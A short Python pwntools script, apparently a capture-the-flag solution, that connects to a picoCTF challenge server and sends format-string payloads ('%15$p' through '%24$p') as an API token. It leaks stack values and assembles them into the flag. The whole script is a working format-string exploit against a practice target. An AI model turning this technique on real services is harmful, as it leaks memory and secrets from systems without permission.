from pwn import *

flag = b''
for i in range(15, 25):
    with context.local(log_level="error"):
        r = remote("mercury.picoctf.net", 16439)
        r.sendlineafter("What would you like to do?\n", "1")
        r.sendlineafter("What is your API token?\n", f"%{i}$p")
        r.recvuntilS("Buying stonks with token:\n")
        out = r.recvline()
        try:
            res = p32(int(out.decode(), 16))
            flag += res
        except Exception:
            pass
        r.recvall()

print(flag)
